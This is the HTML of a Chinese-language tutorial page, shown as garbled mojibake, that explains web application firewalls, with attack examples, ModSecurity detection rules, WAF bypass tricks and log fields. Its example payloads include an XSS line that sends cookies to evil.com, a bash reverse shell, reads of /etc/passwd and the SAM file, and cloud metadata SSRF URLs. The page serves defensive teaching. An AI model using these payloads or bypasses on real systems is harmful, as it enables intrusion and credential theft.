    â•‘  â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•  â•‘
    â•‘  â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—      â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â•‘
    â•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•      â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â•    â•‘
    â•‘  â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘         â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘       â•‘
    â•‘   â•šâ•â•â•â•šâ•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•         â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•       â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        </pre>
        <h1>What The <span class="highlight glitch-text">WAF</span></h1>
        <p>æ·±å…¥äº†è§£ Web Application Firewall çš„é‹ä½œåŸç†ï¼Œå­¸ç¿’å¦‚ä½•ä¿è­·æ‚¨çš„ç¶²ç«™æ‡‰ç”¨ç¨‹å¼å…å—å¸¸è¦‹æ”»æ“Š</p>
        <a href="#intro" class="btn btn-primary">$ ./start_learning</a>
    </section>

    <div class="container">
        <!-- Introduction Section -->
        <section id="intro">
            <h2>ä»€éº¼æ˜¯ WAF</h2>
            <div class="card-grid">
                <div class="card">
                    <h3><span class="icon">[DEF]</span> å®šç¾©</h3>
                    <p>Web Application Firewall (WAF) æ˜¯ä¸€ç¨®æ‡‰ç”¨å±¤é˜²ç«ç‰†ï¼Œå°ˆé–€ç”¨æ–¼ç›£æ§ã€éæ¿¾å’Œé˜»æ­¢é€²å‡º Web æ‡‰ç”¨ç¨‹å¼çš„ HTTP/HTTPS æµé‡ã€‚</p>
                </div>
                <div class="card">
                    <h3><span class="icon">[OBJ]</span> ç›®çš„</h3>
                    <p>WAF ä¸»è¦ç›®çš„æ˜¯ä¿è­· Web æ‡‰ç”¨ç¨‹å¼å…å—å¸¸è¦‹çš„æ”»æ“Šï¼Œå¦‚ SQL Injectionã€XSSã€CSRF ç­‰ OWASP Top 10 å¨è„…ã€‚</p>
                </div>
                <div class="card">
                    <h3><span class="icon">[HOW]</span> é‹ä½œæ–¹å¼</h3>
                    <p>WAF é€éé å®šç¾©çš„è¦å‰‡é›†æˆ–æ©Ÿå™¨å­¸ç¿’æ¨¡å‹ä¾†åˆ†æ HTTP è«‹æ±‚ï¼Œè­˜åˆ¥ä¸¦é˜»æ­¢æƒ¡æ„æµé‡ã€‚</p>
                </div>
            </div>

            <div class="rule-demo" style="margin-top: 2rem;">
                <h3 style="margin-bottom: 1.5rem;">WAF æ¶æ§‹ç¤ºæ„</h3>

                <!-- WAF Architecture Diagram -->
                <div class="waf-architecture">
                    <!-- Main Flow: User â†’ WAF â†’ Web Server â†’ Database -->
                    <div class="arch-flow">
                        <div class="arch-node">
                            <div class="arch-box">
                                <span class="arch-icon">ğŸ‘¤</span>
                                <span class="arch-label">User</span>
                            </div>
                            <p class="arch-desc">ç™¼é€ HTTP è«‹æ±‚</p>
                        </div>

                        <div class="arch-arrow">â†’</div>

                        <div class="arch-node arch-node-waf">
                            <div class="arch-box arch-box-waf">
                                <span class="arch-icon">ğŸ›¡ï¸</span>
                                <span class="arch-label">WAF</span>
                            </div>
                            <p class="arch-desc">éæ¿¾æƒ¡æ„æµé‡</p>

                            <!-- Vertical connector to Rule Engine -->
                            <div class="arch-connector">
                                <div class="arch-line-v"></div>
                                <div class="arch-arrow-down">â–¼</div>
                            </div>

                            <!-- Rule Engine Box -->
                            <div class="rule-engine-box">
                                <div class="rule-engine-header">Rule Engine</div>
                                <ul class="rule-engine-list">
                                    <li><span class="rule-icon">ğŸ“</span> Signatures <span class="rule-hint">- ç‰¹å¾µæ¯”å°</span></li>
                                    <li><span class="rule-icon">ğŸ”</span> Regex <span class="rule-hint">- æ­£å‰‡è¡¨é”å¼</span></li>
                                    <li><span class="rule-icon">ğŸ¤–</span> ML Model <span class="rule-hint">- æ©Ÿå™¨å­¸ç¿’</span></li>
                                </ul>
                            </div>
                        </div>

                        <div class="arch-arrow">â†’</div>

                        <div class="arch-node">
                            <div class="arch-box">
                                <span class="arch-icon">ğŸ–¥ï¸</span>
                                <span class="arch-label">Web Server</span>
                            </div>
                            <p class="arch-desc">è™•ç†åˆæ³•è«‹æ±‚</p>
                        </div>

                        <div class="arch-arrow">â†’</div>

                        <div class="arch-node">
                            <div class="arch-box">
                                <span class="arch-icon">ğŸ—„ï¸</span>
                                <span class="arch-label">Database</span>
                            </div>
                            <p class="arch-desc">å„²å­˜è³‡æ–™</p>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Attack Types Section -->
        <section id="attacks">
            <h2>å¸¸è¦‹æ”»æ“Šé¡å‹</h2>

            <div class="tabs">
                <button class="tab active" data-tab="sqli">SQL Injection</button>
                <button class="tab" data-tab="xss">XSS</button>
                <button class="tab" data-tab="rce">Command Injection</button>
                <button class="tab" data-tab="path">Path Traversal</button>
                <button class="tab" data-tab="ssrf">SSRF</button>
            </div>

            <!-- SQL Injection -->
            <div class="tab-content active" id="sqli">
                <div class="card">
                    <span class="attack-badge badge-critical">CRITICAL</span>
                    <h3><span class="icon">[SQLi]</span> SQL Injection (SQL æ³¨å…¥)</h3>
                    <p>æ”»æ“Šè€…é€éåœ¨è¼¸å…¥æ¬„ä½ä¸­æ³¨å…¥æƒ¡æ„ SQL ç¨‹å¼ç¢¼ï¼Œä¾†æ“æ§å¾Œç«¯è³‡æ–™åº«ã€‚</p>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">æ”»æ“Šç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment">-- åŸºæœ¬èªè­‰ç¹é</span>
<span class="code-danger">' OR '1'='1</span>
<span class="code-danger">' OR 1=1--</span>
<span class="code-danger">admin'--</span>

<span class="code-comment">-- Union æ”»æ“Š</span>
<span class="code-danger">' UNION SELECT username, password FROM users--</span>

<span class="code-comment">-- æ™‚é–“ç›²æ³¨</span>
<span class="code-danger">' AND SLEEP(5)--</span>
<span class="code-danger">' AND IF(1=1, SLEEP(5), 0)--</span>

<span class="code-comment">-- å †ç–ŠæŸ¥è©¢</span>
<span class="code-danger">'; DROP TABLE users;--</span>
                        </code>
                    </div>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">WAF åµæ¸¬è¦å‰‡ç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># ModSecurity è¦å‰‡ç¯„ä¾‹</span>
SecRule ARGS <span class="code-string">"(?i)(union.*select|select.*from|insert.*into|delete.*from|drop\s+table)"</span> \
    <span class="code-keyword">"id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected'"</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- XSS -->
            <div class="tab-content" id="xss">
                <div class="card">
                    <span class="attack-badge badge-high">HIGH</span>
                    <h3><span class="icon">[XSS]</span> Cross-Site Scripting (XSS)</h3>
                    <p>æ”»æ“Šè€…å°‡æƒ¡æ„è…³æœ¬æ³¨å…¥åˆ°ç¶²é ä¸­ï¼Œç•¶å…¶ä»–ç”¨æˆ¶ç€è¦½è©²é é¢æ™‚åŸ·è¡Œã€‚</p>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">æ”»æ“Šç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment">// Reflected XSS</span>
<span class="code-danger">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
<span class="code-danger">&lt;img src=x onerror=alert('XSS')&gt;</span>

<span class="code-comment">// DOM-based XSS</span>
<span class="code-danger">&lt;svg onload=alert('XSS')&gt;</span>
<span class="code-danger">&lt;body onpageshow=alert('XSS')&gt;</span>

<span class="code-comment">// Cookie ç«Šå–</span>
<span class="code-danger">&lt;script&gt;new Image().src='http://evil.com/steal?c='+document.cookie&lt;/script&gt;</span>

<span class="code-comment">// äº‹ä»¶è™•ç†å™¨</span>
<span class="code-danger">&lt;div onmouseover="alert('XSS')"&gt;Hover me&lt;/div&gt;</span>
                        </code>
                    </div>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">WAF åµæ¸¬è¦å‰‡ç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># åµæ¸¬ script æ¨™ç±¤å’Œäº‹ä»¶è™•ç†å™¨</span>
SecRule ARGS <span class="code-string">"(?i)(&lt;script|javascript:|on\w+\s*=)"</span> \
    <span class="code-keyword">"id:1002,phase:2,deny,status:403,msg:'XSS Attack Detected'"</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- Command Injection -->
            <div class="tab-content" id="rce">
                <div class="card">
                    <span class="attack-badge badge-critical">CRITICAL</span>
                    <h3><span class="icon">[RCE]</span> Command Injection (å‘½ä»¤æ³¨å…¥)</h3>
                    <p>æ”»æ“Šè€…é€éæ³¨å…¥ç³»çµ±å‘½ä»¤ï¼Œåœ¨ä¼ºæœå™¨ä¸ŠåŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼ã€‚</p>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">æ”»æ“Šç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># å‘½ä»¤ä¸²æ¥</span>
<span class="code-danger">; ls -la</span>
<span class="code-danger">| cat /etc/passwd</span>
<span class="code-danger">&& whoami</span>

<span class="code-comment"># å‘½ä»¤æ›¿æ›</span>
<span class="code-danger">`id`</span>
<span class="code-danger">$(whoami)</span>

<span class="code-comment"># åå½ˆ Shell</span>
<span class="code-danger">; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1</span>
                        </code>
                    </div>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">WAF åµæ¸¬è¦å‰‡ç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># åµæ¸¬å¸¸è¦‹å‘½ä»¤æ³¨å…¥æ¨¡å¼</span>
SecRule ARGS <span class="code-string">"(?i)(;|\||&&|\$\(|`).*(cat|ls|whoami|id|passwd|shadow)"</span> \
    <span class="code-keyword">"id:1003,phase:2,deny,status:403,msg:'Command Injection Detected'"</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- Path Traversal -->
            <div class="tab-content" id="path">
                <div class="card">
                    <span class="attack-badge badge-high">HIGH</span>
                    <h3><span class="icon">[LFI]</span> Path Traversal (è·¯å¾‘ç©¿è¶Š)</h3>
                    <p>æ”»æ“Šè€…é€éæ“ä½œæª”æ¡ˆè·¯å¾‘ä¾†å­˜å–ä¼ºæœå™¨ä¸Šæœªæˆæ¬Šçš„æª”æ¡ˆã€‚</p>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">æ”»æ“Šç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># åŸºæœ¬è·¯å¾‘ç©¿è¶Š</span>
<span class="code-danger">../../../etc/passwd</span>
<span class="code-danger">....//....//....//etc/passwd</span>

<span class="code-comment"># URL ç·¨ç¢¼</span>
<span class="code-danger">%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd</span>
<span class="code-danger">..%252f..%252f..%252fetc/passwd</span>

<span class="code-comment"># Null Byte</span>
<span class="code-danger">../../../etc/passwd%00.jpg</span>

<span class="code-comment"># Windows è·¯å¾‘</span>
<span class="code-danger">..\..\..\windows\system32\config\sam</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- SSRF -->
            <div class="tab-content" id="ssrf">
                <div class="card">
                    <span class="attack-badge badge-high">HIGH</span>
                    <h3><span class="icon">[SSRF]</span> Server-Side Request Forgery (SSRF)</h3>
                    <p>æ”»æ“Šè€…èª˜å°ä¼ºæœå™¨å‘å…§éƒ¨ç¶²è·¯æˆ–å…¶ä»–æœå‹™ç™¼é€è«‹æ±‚ã€‚</p>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">æ”»æ“Šç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># å­˜å–å…§éƒ¨æœå‹™</span>
<span class="code-danger">http://localhost:8080/admin</span>
<span class="code-danger">http://127.0.0.1:3306/</span>

<span class="code-comment"># å­˜å–é›²ç«¯å…ƒè³‡æ–™</span>
<span class="code-danger">http://169.254.169.254/latest/meta-data/</span>
<span class="code-danger">http://metadata.google.internal/</span>

<span class="code-comment"># ç¹éæŠ€è¡“</span>
<span class="code-danger">http://0.0.0.0:8080/</span>
<span class="code-danger">http://[::]:8080/</span>
<span class="code-danger">http://127.1/</span>
                        </code>
                    </div>
                </div>
            </div>
        </section>

        <!-- WAF Rules Section -->
        <section id="rules">
            <h2>WAF è¦å‰‡è¨­è¨ˆ</h2>

            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>æ­£å‰‡è¡¨é”å¼åŸºç¤</h4>
                    <span class="accordion-icon">â–¼</span>
                </div>
                <div class="accordion-content">
                    <p>WAF è¦å‰‡å¤§é‡ä½¿ç”¨æ­£å‰‡è¡¨é”å¼ä¾†åŒ¹é…æƒ¡æ„æ¨¡å¼ï¼š</p>
                    <div class="code-block">
                        <code>
<span class="code-comment"># å¸¸ç”¨ Regex å…ƒå­—ç¬¦</span>
.       <span class="code-comment"># åŒ¹é…ä»»æ„å­—ç¬¦</span>
*       <span class="code-comment"># åŒ¹é…å‰ä¸€å€‹å­—ç¬¦ 0 æ¬¡æˆ–å¤šæ¬¡</span>
+       <span class="code-comment"># åŒ¹é…å‰ä¸€å€‹å­—ç¬¦ 1 æ¬¡æˆ–å¤šæ¬¡</span>
?       <span class="code-comment"># åŒ¹é…å‰ä¸€å€‹å­—ç¬¦ 0 æ¬¡æˆ– 1 æ¬¡</span>
\s      <span class="code-comment"># åŒ¹é…ç©ºç™½å­—ç¬¦</span>
\w      <span class="code-comment"># åŒ¹é…å­—æ¯æ•¸å­—å­—ç¬¦</span>
(?i)    <span class="code-comment"># å¤§å°å¯«ä¸æ•æ„Ÿ</span>
|       <span class="code-comment"># æˆ–é‹ç®—ç¬¦</span>

<span class="code-comment"># SQL æ³¨å…¥åµæ¸¬ç¯„ä¾‹</span>
<span class="code-string">(?i)(union\s+select|select\s+.*\s+from)</span>
                        </code>
                    </div>
                </div>
            </div>

            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>ModSecurity è¦å‰‡èªæ³•</h4>
                    <span class="accordion-icon">â–¼</span>
                </div>
                <div class="accordion-content">
                    <p>ModSecurity æ˜¯æœ€æµè¡Œçš„é–‹æº WAF å¼•æ“ï¼š</p>
                    <div class="code-block">
                        <code>
<span class="code-comment"># è¦å‰‡åŸºæœ¬çµæ§‹</span>
SecRule <span class="code-keyword">VARIABLE</span> <span class="code-string">"OPERATOR"</span> <span class="code-keyword">"ACTIONS"</span>

<span class="code-comment"># ç¯„ä¾‹ï¼šé˜»æ“‹ SQL æ³¨å…¥</span>
SecRule ARGS <span class="code-string">"(?i)union.*select"</span> \
    <span class="code-keyword">"id:1001,\
     phase:2,\
     deny,\
     status:403,\
     log,\
     msg:'SQL Injection Attack'"</span>

<span class="code-comment"># å¸¸ç”¨è®Šæ•¸</span>
ARGS            <span class="code-comment"># æ‰€æœ‰è«‹æ±‚åƒæ•¸</span>
REQUEST_URI     <span class="code-comment"># è«‹æ±‚ URI</span>
REQUEST_BODY    <span class="code-comment"># è«‹æ±‚ä¸»é«”</span>
REQUEST_HEADERS <span class="code-comment"># è«‹æ±‚æ¨™é ­</span>
                        </code>
                    </div>
                </div>
            </div>

            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>OWASP CRS (Core Rule Set)</h4>
                    <span class="accordion-icon">â–¼</span>
                </div>
                <div class="accordion-content">
                    <p>OWASP CRS æ˜¯ä¸€çµ„é€šç”¨çš„ WAF è¦å‰‡é›†ï¼š</p>
                    <div class="code-block">
                        <code>
<span class="code-comment"># è¦å‰‡é¡åˆ¥</span>
REQUEST-911-METHOD-ENFORCEMENT    <span class="code-comment"># HTTP æ–¹æ³•é™åˆ¶</span>
REQUEST-913-SCANNER-DETECTION     <span class="code-comment"># æƒæå™¨åµæ¸¬</span>
REQUEST-920-PROTOCOL-ENFORCEMENT  <span class="code-comment"># å”è­°è¦ç¯„</span>
REQUEST-930-APPLICATION-ATTACK-LFI <span class="code-comment"># LFI æ”»æ“Š</span>
REQUEST-931-APPLICATION-ATTACK-RFI <span class="code-comment"># RFI æ”»æ“Š</span>
REQUEST-932-APPLICATION-ATTACK-RCE <span class="code-comment"># RCE æ”»æ“Š</span>
REQUEST-933-APPLICATION-ATTACK-PHP <span class="code-comment"># PHP æ”»æ“Š</span>
REQUEST-941-APPLICATION-ATTACK-XSS <span class="code-comment"># XSS æ”»æ“Š</span>
REQUEST-942-APPLICATION-ATTACK-SQLI <span class="code-comment"># SQL æ³¨å…¥</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- Interactive WAF Demo -->
            <div class="rule-demo">
                <h3 style="margin-bottom: 1rem;">WAF å³æ™‚åµæ¸¬æ¨¡æ“¬å™¨</h3>
                <p style="color: var(--text-secondary); margin-bottom: 1rem;">è¼¸å…¥ä¸€æ®µ payload ä¾†æ¸¬è©¦ WAF æ˜¯å¦æœƒåµæ¸¬åˆ°æ”»æ“Šï¼š</p>

                <div class="rule-input-group">
                    <input type="text" id="waf-input" placeholder="è¼¸å…¥æ¸¬è©¦ payloadï¼Œä¾‹å¦‚ï¼š' OR 1=1--">
                    <button class="btn btn-primary" onclick="checkWAF()">æª¢æ¸¬</button>
                </div>

                <div id="waf-result"></div>

                <div style="margin-top: 1rem;">
                    <p style="color: var(--text-secondary); font-size: 0.875rem;">å¿«é€Ÿæ¸¬è©¦ï¼š</p>
                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-top: 0.5rem;">
                        <button class="btn btn-secondary" data-payload="' OR '1'='1">SQLi åŸºæœ¬</button>
                        <button class="btn btn-secondary" data-payload="&lt;script&gt;alert(1)&lt;/script&gt;">XSS åŸºæœ¬</button>
                        <button class="btn btn-secondary" data-payload="; cat /etc/passwd">å‘½ä»¤æ³¨å…¥</button>
                        <button class="btn btn-secondary" data-payload="../../../etc/passwd">è·¯å¾‘ç©¿è¶Š</button>
                        <button class="btn btn-secondary" data-payload="hello world">æ­£å¸¸è¼¸å…¥</button>
                    </div>
                </div>
            </div>
        </section>

        <!-- Bypass Techniques -->
        <section id="bypass">
            <h2>WAF ç¹éæŠ€è¡“</h2>
            <p style="color: var(--text-secondary); margin-bottom: 2rem;">äº†è§£æ”»æ“Šè€…å¦‚ä½•å˜—è©¦ç¹é WAFï¼Œæœ‰åŠ©æ–¼è¨­è¨ˆæ›´å¼·å¥çš„é˜²è­·è¦å‰‡ã€‚</p>

            <div class="card-grid">
                <div class="card">
                    <h3><span class="icon">[01]</span> å¤§å°å¯«è®Šæ›</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># åŸå§‹</span>
UNION SELECT

<span class="code-comment"># ç¹éå˜—è©¦</span>
<span class="code-danger">UnIoN SeLeCt</span>
<span class="code-danger">uNiOn sElEcT</span>
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>é˜²è­·ï¼š</strong>ä½¿ç”¨ (?i) æ¨™è¨˜é€²è¡Œå¤§å°å¯«ä¸æ•æ„ŸåŒ¹é…
                    </p>
                </div>

                <div class="card">
                    <h3><span class="icon">[02]</span> ç·¨ç¢¼ç¹é</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># URL ç·¨ç¢¼</span>
<span class="code-danger">%27%20OR%20%271%27=%271</span>

<span class="code-comment"># é›™é‡ç·¨ç¢¼</span>
<span class="code-danger">%252f%252e%252e</span>

<span class="code-comment"># Unicode</span>
<span class="code-danger">%u0027</span>
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>é˜²è­·ï¼š</strong>åœ¨æª¢æ¸¬å‰é€²è¡Œå¤šå±¤è§£ç¢¼
                    </p>
                </div>

                <div class="card">
                    <h3><span class="icon">[03]</span> è¨»è§£æ’å…¥</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># SQL è¨»è§£</span>
<span class="code-danger">UN/**/ION/**/SEL/**/ECT</span>
<span class="code-danger">UNION/*!50000SELECT*/</span>

<span class="code-comment"># HTML è¨»è§£</span>
<span class="code-danger">&lt;scr&lt;!--test--&gt;ipt&gt;</span>
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>é˜²è­·ï¼š</strong>ç§»é™¤è¨»è§£å¾Œå†é€²è¡Œæª¢æ¸¬
                    </p>
                </div>

                <div class="card">
                    <h3><span class="icon">[04]</span> ç©ºç™½å­—ç¬¦è®Šæ›</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># Tab ä»£æ›¿ç©ºæ ¼</span>
<span class="code-danger">UNION[TAB]SELECT</span>

<span class="code-comment"># æ›è¡Œç¬¦</span>
<span class="code-danger">UNION%0aSELECT</span>

<span class="code-comment"># å¤šå€‹ç©ºæ ¼</span>
<span class="code-danger">UNION    SELECT</span>
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>é˜²è­·ï¼š</strong>ä½¿ç”¨ \s+ åŒ¹é…ä»»æ„ç©ºç™½å­—ç¬¦
                    </p>
                </div>

                <div class="card">
                    <h3><span class="icon">[05]</span> åŒç¾©è©æ›¿æ›</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># OR çš„æ›¿ä»£</span>
<span class="code-danger">|| (ç®¡é“ç¬¦)</span>

<span class="code-comment"># ç©ºæ ¼æ›¿ä»£</span>
<span class="code-danger">UNION+SELECT</span>

<span class="code-comment"># å‡½æ•¸æ›¿ä»£</span>
<span class="code-danger">CHAR(39) ä»£æ›¿ '</span>
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>é˜²è­·ï¼š</strong>è¦å‰‡æ¶µè“‹å„ç¨®åŒç¾©è¡¨é”
                    </p>
                </div>

                <div class="card">
                    <h3><span class="icon">[06]</span> åƒæ•¸æ±¡æŸ“</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># HPP (HTTP Parameter Pollution)</span>
<span class="code-danger">?id=1&id=UNION&id=SELECT</span>

<span class="code-comment"># ä¸åŒæœå‹™å™¨è™•ç†æ–¹å¼</span>
Apache: å–æœ€å¾Œä¸€å€‹
IIS: åˆä½µæ‰€æœ‰
Tomcat: å–ç¬¬ä¸€å€‹
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>é˜²è­·ï¼š</strong>æª¢æ¸¬æ‰€æœ‰é‡è¤‡åƒæ•¸
                    </p>
                </div>
            </div>
        </section>

        <!-- WAF Log Analysis Section -->
        <section id="log-analysis">
            <h2>WAF æ—¥èªŒåˆ†æå¯¦æˆ°</h2>
            <p style="color: var(--text-secondary); margin-bottom: 2rem;">å­¸ç¿’å¦‚ä½•é–±è®€èˆ‡åˆ†æçœŸå¯¦çš„ WAF é˜»æ“‹æ—¥èªŒï¼Œç†è§£çµæ§‹èˆ‡é—œéµè³‡è¨Šï¼Œå¿«é€Ÿå®šä½å•é¡Œæ ¹å› ã€‚</p>

            <!-- Log Structure Overview -->
            <div class="accordion active">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>WAF æ—¥èªŒçµæ§‹æ¦‚è¦½</h4>
                    <span class="accordion-icon">â–¼</span>
                </div>
                <div class="accordion-content" style="max-height: 2000px; padding: 1.25rem;">
                    <p style="margin-bottom: 1rem;">WAF æ—¥èªŒé€šå¸¸åŒ…å«ä»¥ä¸‹æ ¸å¿ƒæ¬„ä½ï¼Œç†è§£é€™äº›æ¬„ä½æœ‰åŠ©æ–¼å¿«é€Ÿåˆ†æå•é¡Œï¼š</p>
                    <div class="code-block">
                        <code>
<span class="code-comment"># æ ¸å¿ƒè­˜åˆ¥è³‡è¨Š</span>
<span class="code-keyword">id</span>                  <span class="code-comment"># æ—¥èªŒå”¯ä¸€è­˜åˆ¥ç¢¼</span>
<span class="code-keyword">requestDatetime</span>     <span class="code-comment"># è«‹æ±‚æ™‚é–“ (UTC)</span>

<span class="code-comment"># è«‹æ±‚åŸºæœ¬è³‡è¨Š</span>
<span class="code-keyword">method</span>              <span class="code-comment"># HTTP æ–¹æ³• (GET/POST/PUT/DELETE)</span>
<span class="code-keyword">url</span>                 <span class="code-comment"># è«‹æ±‚è·¯å¾‘ (é€šå¸¸ Base64 ç·¨ç¢¼)</span>
<span class="code-keyword">host</span>                <span class="code-comment"># ç›®æ¨™ä¸»æ©Ÿ</span>
<span class="code-keyword">clientIp</span>            <span class="code-comment"># ä¾†æº IP</span>
<span class="code-keyword">clientPort</span>          <span class="code-comment"># ä¾†æºåŸ è™Ÿ</span>

<span class="code-comment"># åŸ·è¡Œç‹€æ…‹</span>
<span class="code-keyword">requestStatus</span>       <span class="code-comment"># è«‹æ±‚ç‹€æ…‹ (blocked/passed)</span>
<span class="code-keyword">enforcementAction</span>   <span class="code-comment"># åŸ·è¡Œå‹•ä½œ (block/allow/alarm)</span>
<span class="code-keyword">responseCode</span>        <span class="code-comment"># HTTP å›æ‡‰ç¢¼</span>

<span class="code-comment"># é•è¦è©³æƒ…</span>
<span class="code-keyword">violations[]</span>        <span class="code-comment"># é•è¦é …ç›®é™£åˆ—</span>
<span class="code-keyword">enforcementState</span>    <span class="code-comment"># æ•´é«”åŸ·è¡Œç‹€æ…‹èˆ‡å¨è„…ç­‰ç´š</span>
<span class="code-keyword">attackType[]</span>        <span class="code-comment"># åµæ¸¬åˆ°çš„æ”»æ“Šé¡å‹</span>

<span class="code-comment"># åŸå§‹è«‹æ±‚</span>
<span class="code-keyword">rawRequest</span>          <span class="code-comment"># Base64 ç·¨ç¢¼çš„åŸå§‹ HTTP è«‹æ±‚</span>
<span class="code-keyword">requestPolicy</span>       <span class="code-comment"># å¥—ç”¨çš„å®‰å…¨ç­–ç•¥åç¨±</span>
                        </code>
                    </div>
                </div>
            </div>

            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>å¸¸è¦‹é•è¦é¡å‹èªªæ˜</h4>
                    <span class="accordion-icon">â–¼</span>
                </div>
                <div class="accordion-content">
                    <div class="code-block">
                        <code>
<span class="code-comment"># å¨è„…è©•åˆ†ç›¸é—œ</span>
<span class="code-danger">VIOL_RATING_THREAT</span>    <span class="code-comment"># å¨è„…è©•åˆ†è¶…éé–¾å€¼</span>

<span class="code-comment"># å®¢æˆ¶ç«¯è¡Œç‚º</span>
<span class="code-danger">VIOL_BOT_CLIENT</span>       <span class="code-comment"># åµæ¸¬åˆ° Bot/è‡ªå‹•åŒ–å·¥å…·</span>

<span class="code-comment"># HTTP å”è­°ç›¸é—œ</span>
<span class="code-danger">VIOL_HTTP_RESPONSE_STATUS</span>  <span class="code-comment"># ç•°å¸¸ HTTP å›æ‡‰ç‹€æ…‹</span>

<span class="code-comment"># è³‡æ–™æ ¼å¼ç›¸é—œ</span>
<span class="code-danger">VIOL_JSON_MALFORMED</span>   <span class="code-comment"># JSON æ ¼å¼éŒ¯èª¤/æ”»æ“Š</span>
<span class="code-danger">VIOL_XML_MALFORMED</span>    <span class="code-comment"># XML æ ¼å¼éŒ¯èª¤/æ”»æ“Š</span>

<span class="code-comment"># å…§å®¹æª¢æŸ¥</span>
<span class="code-danger">VIOL_PARAMETER</span>        <span class="code-comment"># åƒæ•¸é•è¦</span>
<span class="code-danger">VIOL_ATTACK_SIGNATURE</span> <span class="code-comment"># åŒ¹é…æ”»æ“Šç‰¹å¾µ</span>
                        </code>
                    </div>
                </div>
            </div>

            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>æ”»æ“Šé¡å‹ (attackType) èªªæ˜</h4>
                    <span class="accordion-icon">â–¼</span>
                </div>
                <div class="accordion-content">
                    <div class="code-block">
                        <code>
<span class="code-comment"># å®¢æˆ¶ç«¯è­˜åˆ¥</span>
